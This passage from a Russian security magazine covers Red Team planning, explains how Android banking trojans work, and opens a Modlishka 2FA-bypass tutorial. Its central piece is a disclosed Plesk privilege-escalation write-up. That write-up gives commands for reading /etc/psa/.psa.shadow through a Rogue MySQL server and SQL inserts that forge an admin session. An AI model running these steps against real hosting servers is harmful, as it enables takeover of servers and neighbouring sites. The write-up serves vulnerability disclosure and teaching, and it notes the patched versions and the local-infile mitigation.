 • Что должна делать Blue Team для повышения своей эффективности
   и уровня защищенности?




RED TEAM: ЗАДАЧИ
Итак, красная команда имитирует действия злоумыш ленника, чтобы повысить
уровень защищен ности инфраструктуры. Вот задачи, которые она должна
решать, чтобы достигать своих целей:
 • повышение уровня осведомленности Blue Team за счет непрерывных нас‐
   тупательных мероприятий;
 • проверка эффектив ности существу ющих процессов и средств информа‐
   ционной безопасности;
 • разработка и развитие набора инструментов (фреймворка) для улучшения
   возможностей выявления, прог нозирования угроз и организации сце‐
   нариев реагирования на появляющиеся угрозы.

Понятно, что решения этих задач не добить ся, если не концентрироваться
на безопасности и не подходить ответс твенно к реализации всех проверок.
А значит, для красной команды недопус тимо нарушение трех пос тулатов ИБ:
конфиденциальности, целости и дос тупности всех проверяемых ресурсов
(только если это «нарушение» заведомо не будет частью проверки).


RED TEAM: КЛЮЧЕВЫЕ ПОКАЗАТЕЛИ ЭФФЕКТИВНОСТИ
Мы разобрались с высокоуровневыми и бизнес‐задачами Red Team. Теперь
погружаемся непосредственно в особенности функциони рования красной
команды.
  Формулировка низкоуровневых (технических) целей для команды может
различаться в зависимос ти от характеристик биз неса. Раз мер организации,
виды ее активов, особенности внутренней структуры службы безопас ности,
бюджет на ИБ — все это влияет на формулировку. Например, перед коман‐
дой могут стоять следующие задачи:
 • закрепление в домене с последу ющей демонстрацией доступа;
 • компрометация основных систем (например, внутреннего сервера Git, баз
   данных);
 • компрометация имеющихся систем защиты (получе ние административ‐
   ного доступа к панели управления, изменение конфигурационных фай лов
   и так далее);
 • получение доступа с пос леду ющим закреплением на рабочих станциях
   топ‐менеджеров.

Все поставленные цели так или ина че сводятся к реализации Attack Kill Chain.
О жизненном цикле атаки я уже рассказывал в сво ей пре дыду щей колонке
в контексте таргетированных атак. Именно эти стадии используются в ходе
работ Red Team как «дорожная карта» для продвижения к цели.





  Жизненный цикл таргетированной ата ки (Attack Kill Chain) и road map
  для красной команды

Среди многообразия иллюстраций Kill Chain наиболее пригодна для исполь‐
зования экспертами Red Team матрица MITRE ATT&CK, которая содержит
в себе актуальный набор TTP ата кующих.





                     Матрица MITRE ATT&CK

Описанные в этом документе TTP понятны не только команде атакующих, они
могут использоваться и Blue Team. Например, современные «отчеты об угро‐
зах», которые Blue Team получа ет в рамках услуг Threat Intelligence, часто
содержат не только технические осо бенности работы вредоносного кода,
но и TTP, которые APT‐группы используют для его доставки и прод вижения
к цели.
  Получается,  что  эта матрица может  стать своеобразным словарем
для общения красной и синей команд.


УПРАВЛЕНИЕ КОМАНДОЙ И ДОСТАВКА РЕЗУЛЬТАТОВ
Если бы задача Red Team заключалась исключитель но в компрометации сети,
то процесс выглядел бы пример но так: лидер команды согласует низкоуров‐
невые цели, затем уходит куда‐то на нес коль ко месяцев и возвращается
с отчетом «Мы вас поломали вот таким вот обра зом». К счастью, это не так.
  Тимлид (менеджер команды) фиксирует ключевые цели — так называемые
crown jewels — королевские бриллианты, ну или «флаги» в терминах CTF.
Затем он, исходя из этих целей, планиру ет детальную дорожную карту про‐
екта, особенностей объекта атаки и ресурсов команды. Ниже пример дорож‐
ной карты красной команды французского CERT.





            Пример дорож ной карты проекта для Red Team

Как видишь, проект делится на стадии атак с учетом при мерных сроков
реализации каждой из них, отмечены ключевые эта пы (milestones). На тех
или иных ключевых этапах тимлид должен давать обратную связь всем заин‐
тересованным  сторонам  (в  первую  очередь  Blue  Team)  и  сообщать
об успешности выпол нения этапа и готовности переходить на следующий.
   Также тимлид может демонстрировать промежу точные результаты в виде
небольших отче тов на каждой ста дии. К примеру, при завершении этапа
«доставка полезной нагрузки» (delivery) Red Team может отработать вектор
spear‐phishing и отпра вить пейлоад (имплант) сот рудникам организации
в виде вложения в фишинговое письмо. По резуль татам доставки тимлид
готовит отчет о статистике открытия писем с перечислением конкретных лиц,
запустивших имплант, а также прикладывает при мер фишингового письма.
   Эти результаты Blue Team может использовать для повышения осведом‐
ленности  сотрудников,  запустивших  имплант,  для  тонкой  нас тройки
спам‐фильтров и компонентов антифишин га.


ВЫВОДЫ
Проект Red Team — это практически стартап внутри организации. Или даже
стартап вне организации, который может обслуживать несколько крупных
компаний в параллельном режиме.
  В этом материале мы рас смот рели цели и задачи красной команды, изу‐
чили ключевые особенности ее работы. Надеюсь, ты все же понял главную
мысль: наступательная безопас ность может быть использована не только
как инструмент, позволя ющий доказать всем, что «все плохо», а как инс тру‐
мент, который в непрерывном режиме повышает безопасность бизнеса.
   Да, не каждая организа ция готова к внедрению процессов Red Teaming —
для этого должны быть зрелыми определен ные процессы ИБ. Но когда ком‐
пания становится готова к созданию своей красной команды, она при нимает
ту «философию», которую прекрасно описал Сунь‐Цзы: «Держи друзей близ‐
ко к себе, а врагов еще ближе».
ВЗЛОМ




АТАКА
НА ХОСТИНГ

КАК Я РАСКРУТИЛ
ЭСКАЛАЦИЮ ПРИВИЛЕГИЙ В PLESK





 Филипп Охонько
  mustang@reg.ru





Рут на shared‐хостинге — не обязательно публичная уяз‐
вимость в ядре Linux. В этой статье будет разобрана уяз‐
вимость в популярной хостинг‐панели Plesk, позволяющая
повысить привилегии на хостинго вом сервере и получить
доступ ко всем соседям.


Чтобы предоставлять услуги хостинга сайтов, в наше время недостаточно
веб‐сервера и аккаунта на FTP. Существует нес коль ко популярных панелей,
которые позволяют без трудностей развернуть и поддерживать сайт даже
неопытному пользователю. Там есть файловый менеджер, текстовый редак‐
тор, интерфейс для управления базами данных, выбор версии PHP и все, что
может понадобиться поль зователю хостинга.
  Одна из таких панелей — Plesk. Эта панель используется хостинг‐провай‐
дерами по всему миру, включая таких гигантов, как GoDaddy. Взлом хостинга
может обернуться серьезными пос ледствиями — нап ример, известен слу чай,
когда злоумышленники взломали хос тера, зашифровали все дан ные и тре‐
бовали за них миллион долларов.
   Уязвимость, о которой я хочу рас сказать, — это чтение файлов с повышен‐
ными привилегиями с помощью ата ки Rogue MySQL Server. Она в итоге обер‐
нулась эскалацией привилегий.


СТЕНД
Итак, самое вре мя надеть белую шляпу и прис тупать к ресерчу. Основная
часть Plesk написана на PHP. Plesk быва ет под Windows Server и Linux, нас
интересует последний. Для стенда про ще всего использовать локальную вир‐
туалку или VPS c Ubuntu 16.04 на борту. Для начала загружаем инстал лятор
и даем права на исполнение.


$ wget 'http://installer.plesk.com/plesk‐installer'
$ chmod +x plesk‐installer

Помимо привычной тебе системы обновлений через версии, в Plesk имеется
еще и такая вещь, как микроап дейты (Micro‐Updates). Это, по сути, патчи
к исходникам на PHP, при накатывании которых версия панели остается неиз‐
менной. Уязвимость, о которой мы поговорим, была устранена с помощью
такого апдейта, поэтому инсталлер нуж но запус кать с флагом skip‐patch,
и тогда фикс, зак рывающий уязвимость, не применится.


$ sudo ./plesk‐installer ‐‐skip‐patch

Далее  в  интерактивном меню  нужно  подтвердить  установку, выбрать
рекомендуемые параметры, и мож но спо кой но попивать кофе, пока все
сетапится. После того как все уста нови лось, в консоль будет выведен линк,
пройдя по которому ты сможешь создать учет ку админа. Там же можно акти‐
вировать пятнадцатидневный триал, которого впол не хватает для наших тем‐
ных исследовательских дел.
   Plesk имеет хороший  CLI‐API, которым мы и воспользуемся,  чтобы
не возиться с вебом. В лучших тра дициях Unix настро им все, не покидая тер‐
минала.
  Для начала создадим пользователя с минимальными привилегиями
и добавим ему домен.


$ PLSK_SITE_IP=$(sudo plesk bin ipmanage ‐l | grep ‐o '[0‐9]\{1,
3\}\.[0‐9]\{1,3\}\.[0‐9]\{1,3\}\.[0‐9]\{1,3\}' | head ‐n 1)
$ sudo plesk bin customer ‐‐create researcher ‐name "russian bear"
‐passwd "SamPle123!" ‐notify false
$ sudo plesk bin subscription ‐c example.com ‐owner researcher
‐service‐plan "Default Domain" ‐ip $PLSK_SITE_IP ‐login researcher
‐passwd "SamPle123!"

Еще нам понадобится база данных. Создадим MySQL юзера и базу.


$ sudo plesk bin database ‐‐create testdb ‐domain example.com ‐type
mysql
$ sudo plesk bin database ‐‐create‐dbuser testuser ‐passwd "SamPle
123!" ‐domain example.com ‐server localhost:3306 ‐database testdb

Тестовый стенд готов. Залогиниться в панель от созданного юзера re‐
searcher можно по адресу https://{YOUR_IP}:8443/. Полученный нами
минимальный набор функций будет дос тупен на любом хостинге с Plesk.


АНАЛИЗ УЯЗВИМОСТИ
Интерес представляют функции управления базами данных. Plesk имеет
любопытную фичу, которая позволяет копировать базы данных не только
локально, но и на внешние хос ты. Имен но здесь кроется уяз вимость.



plib/DatabaseManagerMySQL.php
...
private function _mysql_connect($host, $port, $login, $password,
$dbname = null)
{
    $connection = @new mysqli($host, $login, $password, $dbname,
$port);
    if (!$connection || mysqli_connect_errno()) {
        throw new PleskUserDBException(
            mysqli_connect_error(), mysqli_connect_errno(),
            'mysql', $this‐>getErrorType(mysqli_connect_errno())
        );
    }
    return $connection;
}
...

Чтобы получить исходники панели, пришлось здо рово поработать над деоб‐
фускацией, но об этом как‐нибудь в дру гой раз. При копировании базы дан‐
ных на внешний хост приложение использовало стандартный для PHP клиент
mysqlnd, где по умол чанию опция local_infile равна единице, и это как раз
и открывает дорогу к соз данию читалки фай лов.





Чтобы проэксплуатировать уяз вимость, сперва нужно развернуть Rogue
MySQL Server. Далее идем в Databases → Copy и копируем базу в наш Rogue
MySQL сервер.





После чего получаем указанный файл. На этом анализ можно завершать
и приступать к сле дующей части.


ПОВЫШАЕМ ПРИВИЛЕГИИ
Обнаружить уязвимость — это всего полдела, ведь ее еще нужно суметь про‐
эксплуатировать. Прочитать passwd, имея хос тинговый аккаунт, можно с лег‐
костью и без перечисленных выше манипуляций.
  Сначала нужно выяснить, с какими при вилегиями работает читал ка фай‐
лов. Здесь нам поможет псевдофайловая система /proc, а именно чтение
файла /proc/self/status, в котором содержится много полезной информа‐
ции о текущем процессе.





В этом файле есть уникальный ID системного юзера — UID. Теперь, чтобы
узнать пользователя, от имени которого мы можем читать файлы, достаточно
открыть passwd и найти там соответству ющую запись с нужным UID. В моем
случае UID 999 — это юзер psaadm, от имени которо го работает панель.
  На ум сразу приходит читать конфигура ционные файлы. Ведь должна же
панель откуда‐то брать креды к такому большому количес тву сервисов.
Полистав конфиги, я задался вопросом — а откуда, собственно, панель берет
информацию для доступа к MySQL? Ока залось, что суперъюзер базы данных
имеет логин admin, а пароль к нему лежит в файле /etc/psa/.psa.shadow.


$ ls ‐l /etc/psa/.psa.shadow
‐rw‐‐‐‐‐‐‐ 1 psaadm psaadm 62 Apr 22 19:14 /etc/psa/.psa.shadow

Как видим, этот файл дос тупен на чтение и запись только юзеру psaadm.
Читаем его с помощью Rogue MySQL и получа ем рутовый доступ к БД.
На этом этапе мы видим все базы, что уже дает мас су воз можнос тей
для дальнейших атак на соседей. Но нам интересен рут на всем сервере,
поэтому двигаемся даль ше.





Для своих нужд Plesk тоже использует базу данных с име нем psa на этом же
сервере MySQL. Бегло осмотрев базу, я зап риметил таблицы sessions и Ses‐
sionContexts. Туда пишутся все сес сии залогиненных юзеров. Ты, наверное,
скажешь: «Инсерть скорее же сес сию адми на, и дело в шля пе!» Однако,
как ты можешь заметить, помимо логина и session ID, панель пишет еще мно‐
го уникальных сериализованных данных, которые не всегда можно просто
скопипастить. Давай разберемся, что происходит в базе на момент логина
юзера admin.
  Для этого вклю чим логирование зап росов в файл.


$ sudo touch /var/log/mq_query && sudo chown mysql:mysql /var/log/
mq_query
$ sudo plesk db "SET GLOBAL general_log_file = '/var/log/mq_query'"
$ sudo plesk db "SET GLOBAL general_log = 'ON'"

Логинимся от админа в Plesk и смотрим запросы с INSERT.


$ cat /var/log/mq_query
...
2019‐04‐25T11:58:17.627569Z 46870 Query INSERT INTO `sessions` (`
sess_id`, `type`, `login`, `ip_address`, `login_time`, `modified`, `
lifetime`) VALUES ('057780ebb02bb81977adccf2dc481a79', '1', 'admin',
'87.76.241.179', '1556193497', '1556193497', '1800')
2019‐04‐25T11:58:17.632226Z 46870 Query INSERT INTO `SessionContexts`
 (`contextId`, `sessionId`, `data`) VALUES ('057780ebb02bb81977adccf2
dc481a79', '057780ebb02bb81977adccf2dc481a79', 'a:2:{s:4:\"auth\";a:
1:{s:4:\"type\";i:1;}s:5:\"panel\";a:1:{s:22:\"forgeryProtecti
onToken\";s:32:\"7292742a7d286591eddb828c314f25b4\";}}')
...

Итак, чтобы получить сессию админа, нужно загрузить на хостинговый аккаунт
скрипт на PHP, который подключится к БД от имени пользовате ля admin
и выполнит два простых инсерта.


INSERT INTO `sessions` (`sess_id`, `type`, `login`, `ip_address`,
`login_time`, `modified`, `lifetime`) VALUES ('057780ebb02bb81
977adccf2dc481a79', '1', 'admin', '<YOUR_IP>', NOW(), NOW(), '1800');
INSERT INTO `SessionContexts` (`contextId`, `sessionId`, `data`)
VALUES ('057780ebb02bb81977adccf2dc481a79', '057780ebb02bb81977adccf2
dc481a79', 'a:2:{s:4:\"auth\";a:1:{s:4:\"type\";i:1;}s:5:\"panel\";a:
1:{s:22:\"forgeryProtectionToken\";s:32:\"7292742a7d286591eddb828c
314f25b4\";}}');

Подставляй новоиспеченную сессию себе в куки, и вуаля, ты админ. А для
того, чтобы выпол нить любую команду от рута, дос таточно зай ти в планиров‐
щик задач и записать в крон нужный пейлоад.
  Подведем ито ги. Что бы заполучить рут на хостинговом сервере с панелью
Plesk, нужно сде лать следующее.
 1. С помощью Rogue MySQL Server прочитать пароль от рутового юзера
   базы данных в файле /etc/psa/.psa.shadow.
 2. Загрузить скрипт на PHP, с помощью которо го можно будет подключиться
   к базе данных от рут‐пользователя.
 3. Записать сессию админа и подставить ее в cookies браузера.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Прежде всего хочу отметить оперативную и сла женную работу безопасников
Plesk. После того как я им отпра вил репорт, уязвимость быс тро устранили
в следующих версиях:
 • 17.8.11 MU#34 от 10 декабря 2018 года;
 • 17.5.3 MU#63 от 10 декабря 2018 года;
 • 17.0.17 MU#61 от 17 декабря 2018 года;
 • 12.5.30 MU#78 от 10 декабря 2018 года;
 • 12.0.18 MU#104 от 24 декабря 2018 года.

На сегодняшний день большая часть клиентов MySQL уязвимы, и устранять
вектор Rogue MySQL Server пока никто не торопит ся. Так что, похоже, такие
уязвимости будут всплывать еще долго. Чтобы обезопасить себя от подобных
проблем, стоит ввести прос тое правило: если твое приложе ние коннектится
к хосту, который не localhost, — убедись, что опция local‐infile равна нулю.
ВЗЛОМ
   КАРМАННЫЕ
     ТРОЯНЫ

                        КАК РАБОТАЮТ
               МОБИЛЬНЫЕ БАНКЕРЫ





                                                                          Валентин Холмогоров
                                                                                              valentin@holmogorov.ru





Одним солнечным апрельским утром мой завтрак был прер‐
ван телефонным звонком прияте ля — предпринимателя,
занимавшегося  грузовыми  перевозками. Срывающимся
голосом он рас ска зал, что с его банков ского счета куда‐то
испарились два миллиона рублей. А служба поддержки бан‐
ка развела руками, отправив прияте ля писать заявление
в полицию, поскольку денежные переводы были совершены
с  помощью  мобильного  приложения  и  подтверждены
по SMS, что по всем признакам соответствует вполне
легальной финансовой операции.


«Тыжпрограммист, — прос тонал в труб ку мой приятель, — посоветуй, что
делать». Увы, что‐либо делать было уже поздно, ибо инструментом для кражи
послужил банков ский троян, обос новавшийся на смартфоне моего товарища
задолго до этого досадного инцидента. И предотвратить потерю денег было
можно, лишь заранее изу чив принципы работы и методы борьбы с такими
вредоносными программами. Чем мы пря мо сейчас и займемся.


ОЧЕНЬ ДАВНО, В ОДНОМ ОБЫЧНОМ АНДРОИДЕ…
Первые полноценные банковские трояны для мобиль ной платформы Android
были обнаружены еще в 2011 году. Нет, вредоносы, способные передавать
злоумышленникам вхо дящие SMS‐сооб щения, в том числе содержащие
mTAN‐коды (коды аутентифика ции транзакций), сущес твовали и до этого.
Кроме того, были известны тро яны, умеющие оперировать USSD‐командами.
Они могли перевести заданную злодеями сумму с «привязанной» к телефону
банковской карты, пополнив баланс левого мобиль ного телефона, или узнать
остаток средств на счете. Но полноценными банкерами такие трои, конечно
же, не были, посколь ку заметно уступали по функциональным возможностям
своим десктопным аналогам.
  Все изменилось с появлением Android.SpyEye. Этот трой работал в связке
с вредоносом SpyEye для Windows, бла годаря чему обрел способность обхо‐
дить двухфакторную аутентифика цию. Действовал он следующим образом.
   Как только пользователь зараженной вин ды открывал в браузере банков‐
ский сайт, работающий на компе трой выполнял веб‐инжект, встраивая
в страницу кусок HTML‐кода, который он подгру жал из конфига. Пос кольку
инжект  осуществлялся  на  стороне  клиента,  URL  банковского  сайта
в адресной строке браузера оказывался корректным, а соеди нение было
установлено по протоколу HTTPS. Поэтому содержимое  веб‐страницы
не вызывало у жертвы никаких подоз рений.
   Текст, встро енный тро яном в банковский сайт, гласил, что банк вне запно
изменил условия работы и для авториза ции в сис теме банк‐клиент необ‐
ходимо установить на мобильный телефон неболь шое приложе ние раз мером
около 30 Кбайт, скачав его по предложенной ссылке — «в целях безопас‐
ности». Приложением, естес твенно, был мобильный трой Android.SpyEye.
   Эта вредоносная прог рамма не создавала никаких значков, ее можно
было отыскать только в списке работающих процес сов под названием «Сис‐
тема». Основная задача троя — перехват всех входящих SMS‐сообщений
и пересылка их на управляющий сервер, адрес которого вредонос брал
из XML‐конфига.





       Так выглядел один из первых мобильных банковских троянов —
                             Android.SpyEye

Когда жертва вводит логин и пароль на банковском сай те в окне браузера,
Windows‐троян SpyEye перехватывает и отправляет их ботоводам. После это‐
го злоумышленники в любой момент могут авторизоваться с помощью этих
данных в системе банк‐клиент на сайте банка, однако сервер обя зательно
отправит владельцу счета проверочный код в SMS, который нужно ввести
в специальную форму. Это сообщение будет перехвачено мобильной вер‐
сией SpyEye и передано вирусописателям. Исполь зуя перехват SMS, они
смогут выполнять любые операции по счету, например опустошить его под‐
чистую.





  Примерно так выглядит схема работы первого мобильного банковского
  трояна SpyEye

Узким местом этой довольно сложной схемы была необходимость синхро‐
низации работы банковского и десктопного компонентов троянской связки,
однако указанную проб лему вирусописателям удалось успешно решить. Нес‐
колько месяцев SpyEye наводил шорох среди поль зовате лей банковских сер‐
висов, пока не попал в базы всех популярных анти виру сов, пос ле чего его
деятельность постепенно сошла на нет.


МОБИЛЬНЫЕ БАНКЕРЫ
Спустя какое‐то время сотрудники IT‐отделов банков понемногу освоили
веб‐программирование, и банк‐клиенты окончатель но перекочевали с дес‐
ктопов в мобильные телефоны в виде Android‐приложений. Это значительно
облегчило жизнь вирусо писа телям: у них отпала необходимость замора‐
чиваться с троянами под винду, и они смог ли наконец пол ностью сосредото‐
чить свои усилия на разработке мобильных банкеров. Ведь владелец Android‐
смартфона с банковским приложением на борту — это ходячий кошелек,
опустошить который мечтает каж дый ува жающий себя вирмейкер.
   Как  и  прочие  вредоносы  для  Android,  банкеры  распространялись
под видом каких‐либо полезных программ — «универсальных видеокодеков»
или проигры вателей Flash, в том числе через официальный каталог Google
Play. Троянская функциональность таких приложений, естественно, не афи‐
шировалась разработчиками, и проявля лась она либо спустя какое‐то время,
либо после загрузки очередного обновления. Так, в одном из случаев банкер
раздавался в виде программы, якобы объеди няющей в себе возможности
банк‐клиентов сразу нескольких крупных кредитных организаций. Зачем вам
куча отдельных приложений, когда вместо них мож но скачать одно, с тро‐
яном? Также известны случаи, когда вредоносы встраивались в подлинные
приложения  некоторых  банков, модифицированные  злоумышленниками.
Такие приложения рас пространялись с поддель ных банковских страниц,
оформленных в точности как нас тоящие, а жертв на них завлекали рассылка‐
ми фишинговых писем.
  Еще один вектор распростра нения мобильных банковских троянов —
фишинговые SMS‐рассылки. Обычно это происходит  так. Пользователю,
зарегистрированному на одном из сайтов бесплатных объявлений, приходит
SMS‐сообщение с предложением обмена. При этом получателя называют
по имени, что дол жно усыпить его бдительность, — вирусописатели пред‐
варительно распарсили базу пользователей этого сайта, вытянув отту да всю
полезную информацию. При переходе по короткой ссылке из сообщения
потенциальная жертва направляется на промежу точную страницу, где опре‐
деляется, что пользователь зашел на сайт именно с мобильного устройства
под управлением Android, и выявляется его мобиль ный оператор, после чего
происходит перенаправление на фейковую страницу с сообщением о пос‐
туплении MMS, офор мленную в стилистике соответству ющего ОПСОСа. Пос‐
ле нажатия на кнопку начинается загрузка трояна.





  Пример фишинговой SMS‐рассылки, цель которой — распространение
                        банковского тро яна

Первые мобильные банкеры работали очень просто. Если для функциони‐
рования вредоноса были нужны пра ва админис тратора, он настойчиво
демонстрировал на экра не окно с требованием выдать ему соответс твующие
полномочия, до тех пор пока изму ченный пользователь не согласится на это
действие. Но иногда вирусописа тели шли на раз личные ухищрения, чтобы
обмануть потенциальную жертву. Например, банкер Android.BankBot.29 мас‐
кировал окно запроса прав админис тратора под сообщение при ложе ния
Google  Play:  «Ваша  версия  устарела,  исполь зовать  новую  версию?»
При попытке пользователя нажать на экранную кнопку «Да» layout трояна
исчезал, и тап попадал на кнопку Accept диалогового окна DeviceAdmin,
в результате чего вредонос получал администра торские привиле гии.





  Получить админские пра ва для Android‐трояна не просто, а очень прос‐
                                   то

Еще один банкер доставал пользователей запросом на включение режима
Accessibility Service — специальных возможностей для людей с ограниче‐
ниями по здоровью. А получив такое разрешение, сам включал для себя
админа.





       Другой способ получения привилегий — Accessibility Service

После этого трой прос то висит в памяти мобильного телефона, ожидая
запуска  мобильного  банковского  приложения. При  наступле нии  этого
события он определяет, какое именно приложение запущено, и рису ет
поверх него соответствующую поддельную форму ввода логина и пароля,
а введенные дан ные тут же пересылаются на управляющий сервер по HTTP
в виде JSON или на заданный телефонный номер SMS‐сообщением. Конфиг
мобильного банкера может содержать HTML‐код нес кольких десятков форм
с различным офор млением, копиру ющим интерфейс приложений наиболее
популярных банков. Пос ле это го оста ется толь ко перехватить и отправить
в том же направлении SMS с одноразо выми пароля ми, чтобы пре дос тавить
ботоводам полный доступ к банковскому счету. Входящие сообщения от бан‐
ков при этом обычно скрываются, чтобы не вызывать у жертвы подозрений.





   Мобильные банкеры могут рисовать поддельные окна авторизации
                          популярных банков

Сколько денег подоб ным обра зом было похищено со счетов пользовате лей
Android, сказать трудно, но суммы здесь наверняка фигурируют шестизнач‐
ные. Даже если троянам по какой‐то при чине не удавалось получить доступ
к банковскому счету, они благополучно похища ли реквизиты банковских карт.
Для этого, например, широко использовались фейковые окна привязки карты
к приложению Google Play.





     Для хищения реквизитов банковских карт мно гие мобильные трои
                исполь зуют поддельные окна Google Play

Приобрести что‐либо ценное в приличных интернет‐магазинах с исполь‐
зованием ворованных реквизитов непросто, а вот оплатить онлайн‐игрушки
или покупку музыки в каком‐нибудь сервисе вполне возможно. Подобные
сайты редко заморачиваются серь езной проверкой платежных реквизитов,
поскольку транзакции там обычно копеечные. Чем и пользуются злоумыш‐
ленники.


БАНКБОТЫ
Банкботы — это побочная ветвь эво люции мобильных банкеров. Если обыч‐
ные банковские трои работают более‐менее автономно, то банкботы способ‐
ны получать различные управляющие команды и выполнять их на зараженном
девайсе.
  Команды могут переда вать ся по HTTP, например в формате JSON,
по SMS, а в некото рых случаях даже через специальный Telegram‐канал.
Большинство банкбо тов по команде включают или отключают перехват вхо‐
дящих SMS‐сообщений, могут скрывать полученные SMS (пря тать можно
сообщения с определенных номеров или с заданными ключевыми словами),
отключать звук мобильного телефо на, отправлять сообщения на указанный
злоумышленниками номер с заданным содержимым или выполнять USSD‐
команды. Также ботовод может изменить адрес управляющего сервера
или системный номер телефо на, на который будет пересылаться информа‐
ция, если ее не удалось передать по HTTP.
  Многие банкботы также могут скачивать и уста навливать на мобильном
устройстве APK‐файлы, ссылку на которые ука жет в команде ботовод.
В результате на зараженный девайс попадают другие трояны, имеющие
более широкий ассортимент функций. Также некоторые банкботы уме ют
отображать на экране смартфона активити с присланны ми злодеем парамет‐
рами — это открывает широчайшие воз можнос ти для фишинга и реализации
самых изощренных мошенничес ких схем. Ну и почти все такие вредоносы
умеют сливать на командный сервер адресную кни гу, SMS‐переписку и про‐
чие конфиденциальные данные, а также переадресовы вать входящие звонки
на заданный в команде телефонный номер. Отдель ные экземпляры троянов
ко всему прочему обладают функциями самозащиты: они отсле живают имена
работающих в системе процессов и при обна ружении антивиру са пытаются
выгрузить его, исполь зуя права администра тора.
   Практически все банкботы используют веб‐админку, предос тавля ющую
ботоводам подробную ста тистику по инфицированным девайсам и похищен‐
ной на них информации.





        Типичная админка типичного мобильного банковского бота


ИНДУСТРИЯ
С распространением мобильных устройств на Android производство троянов
для этой платформы стало понемногу превращаться в самую настоящую под‐
польную индустрию. В полной мере кос нулось это и банкеров.
  В даркне те стали появляться объявления о сдаче банковских троянов
под Android в аренду, с предоставлением клиенту админки и техничес кой под‐
держки. А затем начали рас пространяться билдеры, с использовани ем
которых любой желающий без каких‐либо навыков программирования мог
соорудить банковского трояна, маскиру ющегося под выб ранное приложение
или определенную систему банк‐клиент.





           Билдер для соз дания бан ковского троя под Android

Благодаря этому количество банковских троев при мерно с 2017 года начало
расти если не в геометрической прогрессии, то весьма заметно. И шансы
подцепить подобную заразу у пользователей смартфонов на Android тоже
значительно выросли. А с учетом того, что боль шинство подобных вредоно‐
сов работает с привилегиями администра тора, удалить их с устройства
не так‐то просто: для это го в лучшем случае придется запустить систему
в безопасном режиме, в худшем — сбросить девайс к заводским настрой кам
со всеми вытекающими последс твиями.


А КАК БОРОТЬСЯ?
Доказанный факт: даже отключение на телефоне воз можности установки при‐
ложений из сторонних источников далеко не всегда защищает пользователя
от проникновения банкеров. Случаев загрузки подобных вре доносов даже
из официального каталога Google Play извес тно мно жес тво: технология про‐
верки размещаемых там приложений все еще несовершенна.
  Кроме  того, операционную  систему  Android  отличает  значительное
количество уязвимостей, которые могут исполь зоваться вирусописателя ми
в своих, отнюдь не благородных целях. Защитить устройство от несанкциони‐
рованного проникновения зловредов способны анти вирусы, но вот устанав‐
ливать их или нет — личное дело самих пользователей Android. По край ней
мере, мой приятель‐коммерсант пос ле инцидента с похищением денег
решил больше не испытывать судьбу и скачал на свой телефон такую прог‐
рамму: лишней не будет.
ВЗЛОМ
 FUCK
 2FA





                                                         8bit
                                                   vegelin47@mail.ru

     ОБХОДИМ ДВУХФАКТОРНУЮ
         АУТЕНТИФИКАЦИЮ
      С ПОМОЩЬЮ MODLISHKA





Теневые форумы изобилуют предложениями о взломе акка‐
унтов. В большинстве случаев атаки устраивают при помощи
фишинга с подделкой стра ницы авториза ции. Однако такой
метод неэффективен, если пользователю при ходит SMS
с проверочным кодом. Я покажу, как пробить двухфакторную
аутентификацию, на примере взлома аккаунта Google редак‐
тора «Хакера».


ЭКСКУРС В 2FA
Во времена, когда сайты работали по HTTP и о защите толком никто и не
думал, перехватить трафик с учетными данными было совсем несложно.
Потом трафик стали шифровать, и хакерам пришлось придумы вать более
изощренные спо собы подмены и перенаправления маршру тов. Казалось бы,
двухфакторная аутентификация окончательно решила проблему, но все дело
в деталях ее реализации.
  Метод 2FA (Two‐Factor authentication) был при думан как дополнительный
способ подтверждения владельца акка унта. Он основан на нескольких спо‐
собах аутентификации:
 • пользователь что‐то зна ет (например, может ответить, какая была девичья
  фамилия его матери или кличка первого домаш него питомца);
 • пользователь обладает уникальными чертами, которые можно оцифровать
   и срав нить (биометрическая аутентификация);
 • пользователь имеет девайс с уникальным идентификатором (например,
  номер мобильного, флешку с ключевым файлом).

Первый метод еще встречается при восстановлении паролей по контрольным
вопросам. Для регулярного использования он не годится, так как ответы
не меняются и могут быть лег ко скомпро метирова ны. Второй способ чаще
применяется для защиты данных на мобильных гаджетах и для авторизации
клиентских приложений на серверах.
  Самый популярный метод 2FA — третий. Это SMS с проверочными
кодами, генерируемыми по технологии OTP. Код приходит каждый раз раз‐
ный, поэтому угадать его практически невоз можно.
  Однако чем сложнее преодо леть защиту техническими методами, тем лег‐
че бывает это сделать социальной инженерией. Все настолько уве рены
в надежности 2FA, что используют ее для самых ответс твенных опе раций —
от авторизации в Google (а это сразу доступ к почте, дис ку, контактам и всей
хранимой в облаке истории) до систем клиент‐банк.
  При этом возможность обхода такой системы уже показывал австралий‐
ский исследователь Шаб хэм Шах (Shubham Shah). Правда, его метод был
довольно сложен в практичес кой реали зации. В нем использовалась авто‐
ризация по звонку, а не SMS, а предварительно нужно было узнать номер
телефона жертвы и часть учет ных данных. PoC был не особо убедительным,
но наметил вектор атаки.


MODLISHKA
В начале 2019 года поль ский исследователь Пётр Душиньский (Piotr Duszyńs‐
ki) выложил в открытом доступе реверс‐прокси Modlishka. По его словам, этот
инструмент может обой ти двухфакторную аутентификацию, что мы сейчас
и проверим.
   Если сравнить его с тем же SEToolkit (он встроен практически во все
популярные дистрибутивы для пентеста), то разница вот в чем: SET клонирует
и размещает на локальном сервере стра ницу авторизации. Там все основано
на работе скриптов, которые перехватывают вводимые учетные данные жер‐
твы. Можно, конечно, настроить редирект на оригинальный сайт, но трафик
от жертвы до твоего сервера будет незашифрованным. По сути, такого рода
программы выступают в роли web‐серверов с поддельным (фишинговым)
сайтом.
   Modlishka действует ина че. Генерируется свой сертификат, которым шиф‐
руется соединение от жертвы до нашего сервера (чтобы не палиться). Затем
эта машина выступает в роли обратного прокси.
  Другими сло вами, весь тра фик идет на оригинальный сайт с инстанцией
на нашем сервере. У хакера оста ются учетные данные, и захватывается авто‐
ризованная сессия жертвы. Классичес кая MITM‐атака, которую предваряет
фишинг (нужно как‐то заставить жертву уста новить поддельный сертификат
и направить ее на фейковый сайт).


           WARNING

                        Статья  написана  в  образовательных  целях.
                    Ни автор, ни редакция не несут ответственности
                        за любой возможный вред, причиненный изло‐
                     женными здесь материалами.



ПОДНИМАЕМ СТЕНД
Давай поднимем сервер с Modlishka внут ри локальной машины. Я сделаю
это на примере Kali Linux, но принципиальной раз ницы для других дистри‐
бутивов не будет — разве что слегка изменится путь к исходникам Go.
  Вначале ставим Go — на этом языке написан реверс‐прокси, и без Go он
не скомпилируется.


